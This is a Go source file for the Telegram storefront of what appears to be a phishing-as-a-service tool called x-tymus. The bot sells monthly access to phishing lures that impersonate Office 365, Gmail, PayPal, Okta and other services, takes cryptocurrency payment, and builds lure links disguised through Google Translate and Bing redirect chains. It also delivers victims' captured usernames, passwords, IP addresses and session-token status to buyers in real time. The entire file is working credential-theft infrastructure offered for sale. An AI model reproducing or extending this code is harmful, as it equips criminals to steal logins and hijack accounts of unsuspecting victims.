package core

import (
	"fmt"
	_log "log"
	"io"
	"net/url"
	"strconv"
	"strings"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
	"github.com/x-tymus/x-tymus/database"
	"github.com/x-tymus/x-tymus/log"
)

// GlobalBot is set once at startup so other packages can call NotifySession.
var GlobalBot *TelegramBot

type TelegramBot struct {
	api            *tgbotapi.BotAPI
	cfg            *Config
	db             *database.Database
	pendingChoice  map[int64]string // chatId -> chosen phishlet before /pay
}

// pendingPhishlet stores the user's phishlet choice until they send /pay.
func (b *TelegramBot) pendingPhishlet(chatId int64, phishlet string) {
	if b.pendingChoice == nil {
		b.pendingChoice = make(map[int64]string)
	}
	b.pendingChoice[chatId] = phishlet
}

func (b *TelegramBot) popPendingPhishlet(chatId int64) string {
	if b.pendingChoice == nil {
		return ""
	}
	p := b.pendingChoice[chatId]
	delete(b.pendingChoice, chatId)
	return p
}

// availablePhishlets returns names of all loaded phishlets.
func (b *TelegramBot) availablePhishlets() []string {
	var names []string
	for name := range b.cfg.phishlets {
		names = append(names, name)
	}
	return names
}

// phishletKeyboard builds an inline keyboard for phishlet selection.
// Button label shows the friendly service name; callback data stays as raw name.
func (b *TelegramBot) phishletKeyboard(action string) tgbotapi.InlineKeyboardMarkup {
	names := b.availablePhishlets()
	var rows [][]tgbotapi.InlineKeyboardButton
	for i := 0; i < len(names); i += 2 {
		var row []tgbotapi.InlineKeyboardButton
		row = append(row, tgbotapi.NewInlineKeyboardButtonData(phishletFriendlyName(names[i]), action+":"+names[i]))
		if i+1 < len(names) {
			row = append(row, tgbotapi.NewInlineKeyboardButtonData(phishletFriendlyName(names[i+1]), action+":"+names[i+1]))
		}
		rows = append(rows, row)
	}
	return tgbotapi.NewInlineKeyboardMarkup(rows...)
}

// NewTelegramBot creates the bot. Returns nil if no token is configured.
func NewTelegramBot(cfg *Config, db *database.Database) (*TelegramBot, error) {
	token := cfg.GetBotToken()
	if token == "" {
		return nil, nil
	}
	api, err := tgbotapi.NewBotAPI(token)
	if err != nil {
		return nil, fmt.Errorf("telegram bot: %v", err)
	}
	// Silence the tgbotapi library's internal standard-logger noise.
	_log.SetOutput(io.Discard)
	// Drop any existing webhook so long-polling can take over cleanly.
	api.RemoveWebhook()
	b := &TelegramBot{api: api, cfg: cfg, db: db}
	log.Info("telegram bot started: @%s", api.Self.UserName)
	return b, nil
}

// Stop gracefully shuts down the polling loop.
func (b *TelegramBot) Stop() {
	b.api.StopReceivingUpdates()
}

// Start begins polling for updates and the expiry cleanup ticker.
func (b *TelegramBot) Start() {
	go b.expiryLoop()

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 30
	updates, err := b.api.GetUpdatesChan(u)
	if err != nil {
		log.Error("telegram bot: get updates: %v", err)
		return
	}
	for update := range updates {
		if update.CallbackQuery != nil {
			go b.handleCallback(update.CallbackQuery)
			continue
		}
		if update.Message == nil {
			continue
		}
		go b.handleMessage(update.Message)
	}
}

// handleCallback handles inline keyboard button presses (phishlet selection).
func (b *TelegramBot) handleCallback(cb *tgbotapi.CallbackQuery) {
	chatId := cb.Message.Chat.ID
	data := cb.Data // format: "phishlet:<name>" or "renew_phishlet:<name>"

	ack := tgbotapi.NewCallback(cb.ID, "")
	b.api.AnswerCallbackQuery(ack)

	parts := strings.SplitN(data, ":", 2)
	if len(parts) != 2 {
		return
	}
	action, phishlet := parts[0], parts[1]

	switch action {
	case "phishlet":
		// User selected a service — show wallet addresses then ask for TX hash
		btc := b.cfg.GetCryptoBTC()
		eth := b.cfg.GetCryptoETH()
		usdt := b.cfg.GetCryptoUSDT()
		price := b.cfg.GetSubPrice()

		wallets := ""
		if btc != "" {
			wallets += fmt.Sprintf("\n🟠 *BTC:*\n`%s`", btc)
		}
		if eth != "" {
			wallets += fmt.Sprintf("\n\n🔷 *ETH:*\n`%s`", eth)
		}
		if usdt != "" {
			wallets += fmt.Sprintf("\n\n🟢 *USDT (TRC20):*\n`%s`", usdt)
		}
		if wallets == "" {
			wallets = "\n_Wallets not configured yet — contact the admin._"
		}

		b.send(chatId, fmt.Sprintf(
			"✅ *Service selected: %s*\n\n"+
				"💰 *Amount: $%d*\n\n"+
				"Send payment to any of these addresses:%s\n\n"+
				"After sending, submit your TX hash:\n`/pay <tx_hash>`",
			phishletFriendlyName(phishlet), price, wallets))
		b.pendingPhishlet(chatId, phishlet)

	case "renew_phishlet":
		// User renewing — selected a (possibly different) phishlet
		sub, err := b.db.GetSubscriptionByChatId(chatId)
		if err != nil {
			b.send(chatId, "No subscription found to renew.")
			return
		}
		b.send(chatId, fmt.Sprintf(
			"✅ Renewing with service: *%s*\n\n"+
				"Send payment ($%d) and submit TX hash:\n`/renew <tx_hash>`",
			phishletFriendlyName(phishlet), b.cfg.GetSubPrice()))
		// Update the pending phishlet for renewal
		sub.Phishlet = phishlet
		b.db.ActivateSubscription(sub.Id, sub.Username, sub.LureURL, sub.ChainTranslate, sub.ChainBing, sub.ChainDirect, sub.LureId)
		b.pendingPhishlet(chatId, phishlet)
	}
}

// phishletFriendlyName returns a human-readable service name for display.
func phishletFriendlyName(name string) string {
	known := map[string]string{
		"o365":          "🏢 Office 365",
		"office365":     "🏢 Office 365",
		"microsoft":     "🏢 Microsoft",
		"t-online":      "📧 T-Online Email",
		"tonline":       "📧 T-Online Email",
		"gmail":         "📧 Gmail",
		"google":        "🔍 Google",
		"outlook":       "📬 Outlook",
		"yahoo":         "📨 Yahoo Mail",
		"facebook":      "👤 Facebook",
		"instagram":     "📸 Instagram",
		"linkedin":      "💼 LinkedIn",
		"twitter":       "🐦 Twitter / X",
		"apple":         "🍎 Apple ID",
		"icloud":        "☁️ iCloud",
		"amazon":        "🛒 Amazon",
		"paypal":        "💳 PayPal",
		"dropbox":       "📦 Dropbox",
		"github":        "🐙 GitHub",
		"discord":       "💬 Discord",
		"netflix":       "🎬 Netflix",
		"reddit":        "🤖 Reddit",
		"adobe":         "🎨 Adobe",
		"salesforce":    "☁️ Salesforce",
		"okta":          "🔐 Okta",
		"adfs":          "🔐 ADFS",
		"citrix":        "🖥️ Citrix",
		"zoom":          "📹 Zoom",
		"webex":         "📹 Webex",
		"teams":         "💬 Microsoft Teams",
		"sharepoint":    "📂 SharePoint",
		"onedrive":      "☁️ OneDrive",
	}
	if v, ok := known[strings.ToLower(name)]; ok {
		return v
	}
	// Title-case the raw name
	return "🔗 " + strings.ToUpper(name[:1]) + name[1:]
}

// ApproveSub approves a pending subscription: creates user, lure, chain, notifies buyer.
// adminChatId is used to notify the approving admin (0 = skip admin notification).
func (b *TelegramBot) ApproveSub(id int, adminChatId int64) error {
	sub, err := b.db.GetSubscription(id)
	if err != nil {
		return fmt.Errorf("subscription %d not found", id)
	}
	if sub.Status != "pending" {
		return fmt.Errorf("subscription %d is not pending (status: %s)", id, sub.Status)
	}

	username := fmt.Sprintf("sub_%d", sub.TelegramChatId)
	token := GenRandomToken()
	password := GenRandomString(12)
	_, err = b.db.CreateUser(username, password, token)
	if err != nil && !strings.Contains(err.Error(), "already exists") {
		return fmt.Errorf("failed to create user: %v", err)
	}

	phishlet := sub.Phishlet
	if phishlet == "" {
		return fmt.Errorf("no phishlet set for subscription %d", id)
	}
	pl, err := b.cfg.GetPhishlet(phishlet)
	if err != nil {
		return fmt.Errorf("phishlet '%s' not found", phishlet)
	}
	bhost, ok := b.cfg.GetSiteDomain(pl.Name)
	if !ok || bhost == "" {
		return fmt.Errorf("no hostname set for phishlet '%s'", phishlet)
	}

	lure := &Lure{
		Path:        "/" + GenRandomString(8),
		Phishlet:    phishlet,
		RedirectUrl: b.cfg.GetDefaultRedirectUrl(),
		UserId:      username,
	}
	b.cfg.AddLure(phishlet, lure)
	lureIdx := len(b.cfg.lures) - 1

	lureURL, _ := pl.GetLureUrl(lure.Path)
	parsedFinal, _ := url.Parse(lureURL)
	phishBase := parsedFinal.Scheme + "://" + parsedFinal.Host
	outer, _, genErr := GenerateRedirectChain(phishBase, lureURL, 3, b.cfg.GetRedirectChainSecret())

	chainTranslate, chainBing, chainDirect := "", "", outer
	if genErr == nil {
		chainTranslate = "https://translate.google.com/translate?sl=auto&tl=en&u=" + url.QueryEscape(outer)
		chainBing = "https://www.bing.com/translator?to=en&url=" + url.QueryEscape(outer)
	}

	b.db.ActivateSubscription(id, username, lureURL, chainTranslate, chainBing, chainDirect, lureIdx)
	expiry := time.Now().UTC().AddDate(0, 1, 0)

	if adminChatId != 0 {
		b.send(adminChatId, fmt.Sprintf(
			"✅ *Approved* subscription `%d`\nUser: `%s`\nPhishlet: `%s`\nExpires: `%s`",
			id, username, phishlet, expiry.Format("2006-01-02")))
	}
	b.send(sub.TelegramChatId, fmt.Sprintf(
		"🎉 *Your subscription is active!*\n\n"+
			"📅 Expires: `%s`\n\n"+
			"🔗 *Your lure URL:*\n`%s`\n\n"+
			"🌐 *Google Translate link (recommended):*\n`%s`\n\n"+
			"🌐 *Bing Translator link:*\n`%s`\n\n"+
			"📦 *Direct chain:*\n`%s`\n\n"+
			"💬 Use /setnotify <chat_id> to receive session logs.\n"+
			"📊 Use /logs to view captured sessions.",
		expiry.Format("2006-01-02"),
		lureURL, chainTranslate, chainBing, chainDirect))
	return nil
}

// RejectSub rejects and deletes a pending subscription, notifying the buyer.
func (b *TelegramBot) RejectSub(id int, adminChatId int64) error {
	sub, err := b.db.GetSubscription(id)
	if err != nil {
		return fmt.Errorf("subscription %d not found", id)
	}
	b.db.DeleteSubscription(id)
	b.send(sub.TelegramChatId, "❌ Your payment was rejected. Contact support if you believe this is an error.")
	if adminChatId != 0 {
		b.send(adminChatId, fmt.Sprintf("Rejected subscription %d.", id))
	}
	return nil
}

// ─────────────────────────────────────────────────────────────────────────────
// Message router
// ─────────────────────────────────────────────────────────────────────────────

func (b *TelegramBot) handleMessage(msg *tgbotapi.Message) {
	chatId := msg.Chat.ID
	isAdmin := chatId == b.cfg.GetBotAdminChatId()
	text := strings.TrimSpace(msg.Text)
	parts := strings.Fields(text)
	if len(parts) == 0 {
		return
	}
	cmd := strings.ToLower(parts[0])

	if isAdmin {
		b.handleAdmin(msg, cmd, parts)
	} else {
		b.handleUser(msg, cmd, parts)
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Admin commands
// ─────────────────────────────────────────────────────────────────────────────

func (b *TelegramBot) handleAdmin(msg *tgbotapi.Message, cmd string, parts []string) {
	chatId := msg.Chat.ID
	switch cmd {
	case "/start", "/help":
		b.send(chatId, `*x-tymus Admin Bot*

*Subscriptions*
/pending — list pending payments
/approve <id> — approve payment & activate subscription
/reject <id> — reject & delete subscription
/subs — list all active subscriptions
/delsub <id> — delete a subscription

*Users & Sessions*
/stats — overview stats
/sessions — last 10 sessions
/users — list users

*Config*
/setprice <usd> — set subscription price
/setbtc <address> — set BTC wallet
/seteth <address> — set ETH wallet
/setusdt <address> — set USDT (TRC20) wallet
/setphishlet <name> — set default phishlet for new subs`)

	case "/stats":
		subs, _ := b.db.ListSubscriptions()
		sessions, _ := b.db.ListSessions()
		active := 0
		pending := 0
		for _, s := range subs {
			switch s.Status {
			case "active":
				active++
			case "pending":
				pending++
			}
		}
		tokens := 0
		for _, s := range sessions {
			if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
				tokens++
			}
		}
		b.send(chatId, fmt.Sprintf(
			"📊 *Stats*\n\n"+
				"💳 Active subs: `%d`\n"+
				"⏳ Pending payment: `%d`\n"+
				"🎯 Sessions: `%d`\n"+
				"🍪 With tokens: `%d`",
			active, pending, len(sessions), tokens))

	case "/pending":
		subs, _ := b.db.ListSubscriptions()
		var lines []string
		for _, s := range subs {
			if s.Status == "pending" {
				lines = append(lines, fmt.Sprintf(
					"ID `%d` — chat `%d` — phishlet `%s`\nTX: `%s`\n/approve %d | /reject %d",
					s.Id, s.TelegramChatId, s.Phishlet, s.TxHash, s.Id, s.Id))
			}
		}
		if len(lines) == 0 {
			b.send(chatId, "No pending payments.")
			return
		}
		b.send(chatId, "⏳ *Pending Payments*\n\n"+strings.Join(lines, "\n\n"))

	case "/approve":
		if len(parts) < 2 {
			b.send(chatId, "Usage: /approve <id>")
			return
		}
		id, err := strconv.Atoi(parts[1])
		if err != nil {
			b.send(chatId, "Invalid ID.")
			return
		}
		if err := b.ApproveSub(id, chatId); err != nil {
			b.send(chatId, "❌ "+err.Error())
		}

	case "/reject":
		if len(parts) < 2 {
			b.send(chatId, "Usage: /reject <id>")
			return
		}
		id, _ := strconv.Atoi(parts[1])
		if err := b.RejectSub(id, chatId); err != nil {
			b.send(chatId, "❌ "+err.Error())
		}

	case "/subs":
		subs, _ := b.db.ListSubscriptions()
		var lines []string
		for _, s := range subs {
			if s.Status != "active" {
				continue
			}
			exp := time.Unix(s.ExpiresAt, 0).Format("2006-01-02")
			lines = append(lines, fmt.Sprintf(
				"ID `%d` | chat `%d` | `%s` | expires `%s`",
				s.Id, s.TelegramChatId, s.Phishlet, exp))
		}
		if len(lines) == 0 {
			b.send(chatId, "No active subscriptions.")
			return
		}
		b.send(chatId, "✅ *Active Subscriptions*\n\n"+strings.Join(lines, "\n"))

	case "/delsub":
		if len(parts) < 2 {
			b.send(chatId, "Usage: /delsub <id>")
			return
		}
		id, _ := strconv.Atoi(parts[1])
		sub, err := b.db.GetSubscription(id)
		if err != nil {
			b.send(chatId, "Not found.")
			return
		}
		b.db.DeleteSubscription(id)
		b.send(sub.TelegramChatId, "⚠️ Your subscription has been cancelled by the admin.")
		b.send(chatId, fmt.Sprintf("Deleted subscription %d.", id))

	case "/sessions":
		sessions, _ := b.db.ListSessions()
		if len(sessions) == 0 {
			b.send(chatId, "No sessions yet.")
			return
		}
		last := sessions
		if len(last) > 10 {
			last = last[len(last)-10:]
		}
		var lines []string
		for _, s := range last {
			status := "⚪"
			if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 {
				status = "🟢"
			}
			lines = append(lines, fmt.Sprintf(
				"%s `%s` / `%s` — `%s` — `%s`",
				status, tgEscape(s.Username), tgEscape(s.Password), tgEscape(s.Phishlet), tgEscape(s.RemoteAddr)))
		}
		b.send(chatId, "🎯 *Recent Sessions*\n\n"+strings.Join(lines, "\n"))

	case "/users":
		users, _ := b.db.ListUsers()
		if len(users) == 0 {
			b.send(chatId, "No users.")
			return
		}
		var lines []string
		for _, u := range users {
			lines = append(lines, fmt.Sprintf("• `%s` — created `%s`", u.Username, time.Unix(u.CreatedAt, 0).Format("2006-01-02")))
		}
		b.send(chatId, "*Users*\n\n"+strings.Join(lines, "\n"))

	case "/setprice":
		if len(parts) < 2 {
			b.send(chatId, "Usage: /setprice <usd>")
			return
		}
		p, err := strconv.Atoi(parts[1])
		if err != nil || p <= 0 {
			b.send(chatId, "Invalid price.")
			return
		}
		b.cfg.general.SubPrice = p
		b.cfg.cfg.Set(CFG_GENERAL, b.cfg.general)
		b.cfg.cfg.WriteConfig()
		b.send(chatId, fmt.Sprintf("Price set to $%d/month.", p))

	case "/setbtc":
		if len(parts) < 2 {
			b.send(chatId, "Usage: /setbtc <address>")
			return
		}
		b.cfg.general.CryptoBTC = parts[1]
		b.cfg.cfg.Set(CFG_GENERAL, b.cfg.general)
		b.cfg.cfg.WriteConfig()
		b.send(chatId, "BTC wallet updated.")

	case "/seteth":
		if len(parts) < 2 {
			b.send(chatId, "Usage: /seteth <address>")
			return
		}
		b.cfg.general.CryptoETH = parts[1]
		b.cfg.cfg.Set(CFG_GENERAL, b.cfg.general)
		b.cfg.cfg.WriteConfig()
		b.send(chatId, "ETH wallet updated.")

	case "/setusdt":
		if len(parts) < 2 {
			b.send(chatId, "Usage: /setusdt <address>")
			return
		}
		b.cfg.general.CryptoUSDT = parts[1]
		b.cfg.cfg.Set(CFG_GENERAL, b.cfg.general)
		b.cfg.cfg.WriteConfig()
		b.send(chatId, "USDT (TRC20) wallet updated.")

	case "/setphishlet":
		if len(parts) < 2 {
			b.send(chatId, "Usage: /setphishlet <name>")
			return
		}
		b.cfg.general.DefaultPhishlet = parts[1]
		b.cfg.cfg.Set(CFG_GENERAL, b.cfg.general)
		b.cfg.cfg.WriteConfig()
		b.send(chatId, fmt.Sprintf("Default phishlet set to: %s", parts[1]))

	default:
		b.send(chatId, "Unknown command. Send /help for the command list.")
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Buyer / user commands
// ─────────────────────────────────────────────────────────────────────────────

func (b *TelegramBot) handleUser(msg *tgbotapi.Message, cmd string, parts []string) {
	chatId := msg.Chat.ID
	price := b.cfg.GetSubPrice()

	switch cmd {
	case "/start":
		b.send(chatId, fmt.Sprintf(
			"👋 *Welcome to x-tymus*\n\n"+
				"Get your private phishing link — fully managed, top-tier redirect, live session logs delivered straight to Telegram.\n\n"+
				"💰 *Price:* $%d / month\n"+
				"💳 *Payment:* Crypto (BTC, ETH, USDT)\n\n"+
				"📌 Commands:\n"+
				"/buy — see payment instructions\n"+
				"/pay <tx_hash> — submit your payment\n"+
				"/status — check your subscription\n"+
				"/mylink — view your links\n"+
				"/logs — recent captured sessions\n"+
				"/setnotify <chat_id> — set where logs are sent\n"+
				"/help — full command list",
			price))

	case "/help":
		b.send(chatId, fmt.Sprintf(
			"*x-tymus Commands*\n\n"+
				"/buy — payment instructions ($%d/month)\n"+
				"/pay <tx_hash> — submit payment proof\n"+
				"/status — subscription status & expiry\n"+
				"/mylink — your lure URL and redirect chain links\n"+
				"/logs — last 10 captured sessions for your link\n"+
				"/setnotify <chat_id> — set Telegram chat ID for live logs\n"+
				"  → your own chat ID, a group, or another bot",
			price))

	case "/buy":
		// Step 1: show phishlet chooser
		names := b.availablePhishlets()
		if len(names) == 0 {
			b.send(chatId, "No services available yet. Contact the admin.")
			return
		}
		kb := b.phishletKeyboard("phishlet")
		msg2 := tgbotapi.NewMessage(chatId, fmt.Sprintf(
			"💳 *Subscribe — $%d/month*\n\nChoose your service:", price))
		msg2.ParseMode = "Markdown"
		msg2.ReplyMarkup = kb
		b.api.Send(msg2)
		return

	case "/buy_info":
		// Step 2: show wallets after phishlet chosen (also reachable directly)
		btc := b.cfg.GetCryptoBTC()
		eth := b.cfg.GetCryptoETH()
		usdt := b.cfg.GetCryptoUSDT()

		wallets := ""
		if btc != "" {
			wallets += fmt.Sprintf("\n🟠 *BTC:*\n`%s`", btc)
		}
		if eth != "" {
			wallets += fmt.Sprintf("\n🔷 *ETH:*\n`%s`", eth)
		}
		if usdt != "" {
			wallets += fmt.Sprintf("\n🟢 *USDT (TRC20):*\n`%s`", usdt)
		}
		if wallets == "" {
			b.send(chatId, "Wallets not configured yet. Contact the admin.")
			return
		}
		b.send(chatId, fmt.Sprintf(
			"💳 *Payment Instructions*\n\n"+
				"Amount: *$%d*\n\n"+
				"Send to any of these addresses:%s\n\n"+
				"After sending, submit your TX hash:\n`/pay <transaction_hash>`",
			price, wallets))

	case "/pay":
		if len(parts) < 2 {
			b.send(chatId, "Usage: /pay <transaction_hash>\n\nFirst use /buy to choose your service.")
			return
		}
		txHash := parts[1]

		// Check if already subscribed
		existing, err := b.db.GetSubscriptionByChatId(chatId)
		if err == nil {
			switch existing.Status {
			case "pending":
				b.send(chatId, "⏳ Your payment is already pending. Please wait for admin approval.")
				return
			case "active":
				b.send(chatId, fmt.Sprintf(
					"✅ You already have an active subscription until `%s`.\n\nUse /renew to extend it.",
					time.Unix(existing.ExpiresAt, 0).Format("2006-01-02")))
				return
			}
		}

		// Use phishlet from inline keyboard selection (user must choose)
		phishlet := b.popPendingPhishlet(chatId)
		if phishlet == "" {
			b.send(chatId, "Please use /buy first to choose a service, then submit your payment.")
			return
		}

		sub, err := b.db.CreateSubscription(chatId, txHash, phishlet)
		if err != nil {
			b.send(chatId, "Failed to register payment. Try again.")
			return
		}

		b.send(chatId, fmt.Sprintf(
			"⏳ *Payment submitted!*\n\n"+
				"Service: `%s`\n"+
				"TX Hash: `%s`\n"+
				"Reference ID: `%d`\n\n"+
				"The admin will verify and activate your subscription shortly. You'll be notified here.",
			phishletFriendlyName(phishlet), tgEscape(txHash), sub.Id))

		adminId := b.cfg.GetBotAdminChatId()
		if adminId != 0 {
			b.send(adminId, fmt.Sprintf(
				"💰 *New Payment — ID %d*\n\n"+
					"From chat: `%d`\n"+
					"Phishlet: `%s`\n"+
					"TX: `%s`\n\n"+
					"/approve %d | /reject %d",
				sub.Id, chatId, tgEscape(phishlet), tgEscape(txHash), sub.Id, sub.Id))
		}

	case "/renew":
		sub, err := b.db.GetSubscriptionByChatId(chatId)
		if err != nil {
			b.send(chatId, "No subscription found. Use /buy to get one.")
			return
		}

		if len(parts) >= 2 {
			// /renew <tx_hash> — submit renewal payment
			txHash := parts[1]
			phishlet := b.popPendingPhishlet(chatId)
			if phishlet == "" {
				phishlet = sub.Phishlet // keep existing phishlet if not changed
			}
			// Update phishlet on sub record
			sub.Phishlet = phishlet
			sub.TxHash = txHash
			sub.Status = "pending"
			// Write back as pending renewal
			b.db.CreateSubscription(chatId, txHash, phishlet)

			newSub, _ := b.db.GetSubscriptionByChatId(chatId)
			id := 0
			if newSub != nil {
				id = newSub.Id
			}

			b.send(chatId, fmt.Sprintf(
				"⏳ *Renewal submitted!*\n\n"+
					"Service: `%s`\n"+
					"TX Hash: `%s`\n\n"+
					"Admin will verify and extend your subscription.",
				phishletFriendlyName(phishlet), tgEscape(txHash)))

			adminId := b.cfg.GetBotAdminChatId()
			if adminId != 0 {
				b.send(adminId, fmt.Sprintf(
					"🔄 *Renewal Payment — ID %d*\n\n"+
						"From chat: `%d` (existing sub `%d`)\n"+
						"Phishlet: `%s`\n"+
						"TX: `%s`\n\n"+
						"/approve %d | /reject %d",
					id, chatId, sub.Id, tgEscape(phishlet), tgEscape(txHash), id, id))
			}
			return
		}

		// /renew with no args — show phishlet selector + payment info
		expiry := ""
		if sub.ExpiresAt > 0 {
			expiry = fmt.Sprintf("Current expiry: `%s`\n\n", time.Unix(sub.ExpiresAt, 0).Format("2006-01-02"))
		}

		btc := b.cfg.GetCryptoBTC()
		eth := b.cfg.GetCryptoETH()
		usdt := b.cfg.GetCryptoUSDT()
		wallets := ""
		if btc != "" {
			wallets += fmt.Sprintf("\n🟠 BTC: `%s`", btc)
		}
		if eth != "" {
			wallets += fmt.Sprintf("\n🔷 ETH: `%s`", eth)
		}
		if usdt != "" {
			wallets += fmt.Sprintf("\n🟢 USDT (TRC20): `%s`", usdt)
		}

		kb := b.phishletKeyboard("renew_phishlet")
		m := tgbotapi.NewMessage(chatId, fmt.Sprintf(
			"🔄 *Renew Subscription — $%d/month*\n\n"+
				"%sChoose service (or keep current: `%s`):\n%s\n\n"+
				"After choosing, send payment and run:\n`/renew <tx_hash>`",
			price, expiry, phishletFriendlyName(sub.Phishlet), wallets))
		m.ParseMode = "Markdown"
		m.ReplyMarkup = kb
		b.api.Send(m)

	case "/status":
		sub, err := b.db.GetSubscriptionByChatId(chatId)
		if err != nil {
			b.send(chatId, "No subscription found. Use /buy to get started.")
			return
		}
		emoji := map[string]string{"pending": "⏳", "active": "✅", "expired": "❌"}[sub.Status]
		exp := ""
		if sub.ExpiresAt > 0 {
			exp = fmt.Sprintf("\n📅 Expires: `%s`", time.Unix(sub.ExpiresAt, 0).Format("2006-01-02 15:04 UTC"))
		}
		b.send(chatId, fmt.Sprintf(
			"%s *Subscription Status: %s*%s\n\nService: `%s`",
			emoji, strings.ToUpper(sub.Status), exp, phishletFriendlyName(sub.Phishlet)))

	case "/mylink":
		sub, err := b.db.GetSubscriptionByChatId(chatId)
		if err != nil || sub.Status != "active" {
			b.send(chatId, "No active subscription. Use /buy to get one.")
			return
		}
		b.send(chatId, fmt.Sprintf(
			"🔗 *Your Links*\n\n"+
				"*Lure URL:*\n`%s`\n\n"+
				"🌐 *Google Translate (recommended):*\n`%s`\n\n"+
				"🌐 *Bing Translator:*\n`%s`\n\n"+
				"📦 *Direct chain:*\n`%s`\n\n"+
				"📅 Expires: `%s`",
			sub.LureURL,
			sub.ChainTranslate,
			sub.ChainBing,
			sub.ChainDirect,
			time.Unix(sub.ExpiresAt, 0).Format("2006-01-02")))

	case "/setnotify":
		sub, err := b.db.GetSubscriptionByChatId(chatId)
		if err != nil || sub.Status != "active" {
			b.send(chatId, "No active subscription.")
			return
		}
		if len(parts) < 2 {
			b.send(chatId, "Usage: /setnotify <chat_id>\n\nSend /notify_me to get your chat ID, or add me to a group and I'll send the ID.")
			return
		}
		notifyId, err := strconv.ParseInt(parts[1], 10, 64)
		if err != nil {
			b.send(chatId, "Invalid chat ID.")
			return
		}
		b.db.SetSubscriptionNotify(sub.Id, notifyId)
		b.send(chatId, fmt.Sprintf("✅ Session logs will be sent to chat `%d`.", notifyId))
		// Test message
		b.send(notifyId, "✅ x-tymus log delivery is active for your subscription.")

	case "/notify_me":
		b.send(chatId, fmt.Sprintf("Your chat ID is: `%d`\n\nUse `/setnotify %d` to receive logs here.", chatId, chatId))

	case "/logs":
		sub, err := b.db.GetSubscriptionByChatId(chatId)
		if err != nil || sub.Status != "active" {
			b.send(chatId, "No active subscription.")
			return
		}
		sessions, _ := b.db.ListSessions()
		var userSessions []*database.Session
		for _, s := range sessions {
			if s.Phishlet == sub.Phishlet {
				userSessions = append(userSessions, s)
			}
		}
		if len(userSessions) == 0 {
			b.send(chatId, "No sessions captured yet.")
			return
		}
		last := userSessions
		if len(last) > 10 {
			last = last[len(last)-10:]
		}
		var lines []string
		for _, s := range last {
			status := "⚪ no tokens"
			if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 {
				status = "🟢 tokens captured"
			}
			uname := s.Username
			if uname == "" {
				uname = "—"
			}
			pass := s.Password
			if pass == "" {
				pass = "—"
			}
			lines = append(lines, fmt.Sprintf(
				"🎯 `%s` / `%s`\n   IP: `%s`  %s\n   Time: `%s`",
				tgEscape(uname), tgEscape(pass), tgEscape(s.RemoteAddr), status,
				time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04")))
		}
		b.send(chatId, "📋 *Your Sessions*\n\n"+strings.Join(lines, "\n\n"))

	default:
		b.send(chatId, "Unknown command. Send /help for the list.")
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Session notification (called by http_proxy when credentials captured)
// ─────────────────────────────────────────────────────────────────────────────

// NotifySession sends a live session alert to the subscriber's notify chat.
// Called from the http_proxy OnResponse handler when credentials are captured.
func NotifySession(lureId int, phishlet, username, password, remoteAddr string, hasTokens bool) {
	if GlobalBot == nil {
		return
	}
	sub, err := GlobalBot.db.GetSubscriptionByLureId(lureId)
	if err != nil || sub.NotifyChatId == 0 {
		return
	}

	tokenStatus := "⚪ no tokens yet"
	if hasTokens {
		tokenStatus = "🟢 *session tokens captured!*"
	}

	uname := username
	if uname == "" {
		uname = "—"
	}
	pass := password
	if pass == "" {
		pass = "—"
	}

	msg := fmt.Sprintf(
		"🎯 *New Session — %s*\n\n"+
			"👤 Username: `%s`\n"+
			"🔑 Password: `%s`\n"+
			"🌐 IP: `%s`\n"+
			"%s\n\n"+
			"Use /logs to see all sessions.",
		tgEscape(phishlet), tgEscape(uname), tgEscape(pass), tgEscape(remoteAddr), tokenStatus)

	GlobalBot.send(sub.NotifyChatId, msg)
}

// ─────────────────────────────────────────────────────────────────────────────
// Expiry cleanup loop
// ─────────────────────────────────────────────────────────────────────────────

func (b *TelegramBot) expiryLoop() {
	ticker := time.NewTicker(1 * time.Hour)
	defer ticker.Stop()
	for range ticker.C {
		expired, err := b.db.ExpireOldSubscriptions()
		if err != nil || len(expired) == 0 {
			continue
		}
		for _, sub := range expired {
			log.Info("telegram bot: subscription %d expired (chat %d)", sub.Id, sub.TelegramChatId)
			b.send(sub.TelegramChatId,
				"⏰ *Your subscription has expired.*\n\n"+
					"Your link is now deactivated. Use /buy to renew for another month.")
			if b.cfg.GetBotAdminChatId() != 0 {
				b.send(b.cfg.GetBotAdminChatId(), fmt.Sprintf(
					"⏰ Subscription `%d` (chat `%d`) expired and deactivated.", sub.Id, sub.TelegramChatId))
			}
		}
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Helper
// ─────────────────────────────────────────────────────────────────────────────

// tgEscape escapes characters that break Telegram's legacy Markdown parser
// when embedding dynamic/user-supplied content inside formatted messages.
func tgEscape(s string) string {
	s = strings.ReplaceAll(s, "`", "'")
	s = strings.ReplaceAll(s, "*", "\\*")
	s = strings.ReplaceAll(s, "_", "\\_")
	s = strings.ReplaceAll(s, "[", "\\[")
	return s
}

func (b *TelegramBot) send(chatId int64, text string) {
	m := tgbotapi.NewMessage(chatId, text)
	m.ParseMode = "Markdown"
	if _, err := b.api.Send(m); err != nil {
		log.Error("telegram bot: send to %d: %v", chatId, err)
	}
}
